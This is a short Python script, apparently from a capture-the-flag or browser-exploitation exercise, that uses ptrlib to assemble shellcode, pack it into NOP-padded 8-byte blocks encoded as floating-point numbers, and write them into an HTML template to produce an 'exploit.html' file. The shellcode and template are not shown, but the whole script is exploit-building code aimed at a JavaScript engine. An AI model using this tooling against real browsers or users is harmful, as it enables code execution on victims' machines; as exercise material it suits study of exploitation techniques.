from ptrlib import *

with open("shellcode.S", "r") as f:
    code = nasm(f.read(), bits=64)

output = []
for block in chunks(code, 8, b'\x90'):
    output.append(u64(block, type=float))

with open("template.html", "r") as f:
    script = f.read()

with open("exploit.html", "w") as f:
    f.write(script.replace("SHELLCODE", str(output)))
